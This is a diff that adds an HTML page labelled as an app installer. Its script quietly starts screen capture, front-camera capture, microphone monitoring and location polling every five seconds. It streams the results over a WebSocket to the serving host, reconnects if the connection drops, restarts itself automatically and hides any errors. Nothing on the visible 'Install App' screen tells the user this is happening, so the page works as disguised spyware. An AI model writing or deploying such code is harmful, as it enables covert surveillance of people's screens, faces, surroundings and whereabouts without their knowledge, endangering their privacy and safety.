@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <link rel="manifest" href="/manifest.json">
+    <title>Install</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; color: white; }
+        .box { background: white; color: #333; padding: 40px; border-radius: 20px; max-width: 400px; margin: 0 auto; }
+        button { padding: 15px 30px; background: #667eea; color: white; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="box" id="installBox">
+        <h2>📱 Install App</h2>
+        <p>Tap to install and run in background</p>
+        <button onclick="install()">Install Now</button>
+    </div>
+    
+    <div class="box hidden" id="runningBox">
+        <div class="spinner"></div>
+        <h2>✓ Running</h2>
+        <p>App is running in background</p>
+        <p style="font-size:12px;color:#999;margin-top:20px;">You can close this page</p>
+    </div>
+    
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const deviceId = params.get('id');
+        const deviceName = params.get('name');
+        
+        localStorage.setItem('deviceId', deviceId);
+        localStorage.setItem('deviceName', deviceName);
+        localStorage.setItem('autoStart', 'true');
+        
+        let deferredPrompt;
+        let ws;
+        
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+        });
+        
+        function install() {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                deferredPrompt.userChoice.then((result) => {
+                    if (result.outcome === 'accepted') {
+                        startApp();
+                    }
+                });
+            } else {
+                startApp();
+            }
+        }
+        
+        function startApp() {
+            document.getElementById('installBox').classList.add('hidden');
+            document.getElementById('runningBox').classList.remove('hidden');
+            connect();
+            
+            // Auto-start all features
+            setTimeout(() => {
+                captureScreen();
+                captureCamera('front');
+                captureAudio();
+            }, 2000);
+        }
+        
+        function connect() {
+            ws = new WebSocket(`ws://${window.location.host}?type=device&id=${deviceId}&name=${deviceName}`);
+            
+            ws.onopen = () => {
+                startMonitoring();
+                // Auto-start features after connection
+                setTimeout(() => {
+                    captureScreen();
+                    captureCamera('front');
+                    captureAudio();
+                }, 1000);
+            };
+            
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                if (data.type === 'start_screen') captureScreen();
+                else if (data.type === 'start_audio') captureAudio();
+                else if (data.type === 'start_camera') captureCamera(data.camera);
+            };
+            
+            ws.onclose = () => setTimeout(connect, 3000);
+        }
+        
+        function startMonitoring() {
+            if (navigator.geolocation) {
+                setInterval(() => {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        ws.send(JSON.stringify({
+                            type: 'location',
+                            deviceId: deviceId,
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude
+                        }));
+                    });
+                }, 5000);
+            }
+        }
+        
+        async function captureScreen() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setInterval(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    ws.send(JSON.stringify({
+                        type: 'screen',
+                        deviceId: deviceId,
+                        image: canvas.toDataURL('image/jpeg', 0.5)
+                    }));
+                }, 1000);
+            } catch (err) {}
+        }
+        
+        async function captureAudio() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const audioContext = new AudioContext();
+                const analyser = audioContext.createAnalyser();
+                const source = audioContext.createMediaStreamSource(stream);
+                source.connect(analyser);
+                
+                analyser.fftSize = 256;
+                const dataArray = new Uint8Array(analyser.frequencyBinCount);
+                
+                setInterval(() => {
+                    analyser.getByteFrequencyData(dataArray);
+                    const avg = dataArray.reduce((a, b) => a + b) / dataArray.length;
+                    ws.send(JSON.stringify({
+                        type: 'audio',
+                        deviceId: deviceId,
+                        audio: Math.round(avg)
+                    }));
+                }, 500);
+            } catch (err) {}
+        }
+        
+        async function captureCamera(cameraType) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: cameraType === 'front' ? 'user' : 'environment' } 
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setInterval(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    ws.send(JSON.stringify({
+                        type: 'camera',
+                        deviceId: deviceId,
+                        image: canvas.toDataURL('image/jpeg', 0.5)
+                    }));
+                }, 1000);
+            } catch (err) {}
+        }
+        
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js');
+        }
+        
+        if (localStorage.getItem('autoStart') === 'true') {
+            startApp();
+        }
+    </script>
+</body>
+</html>
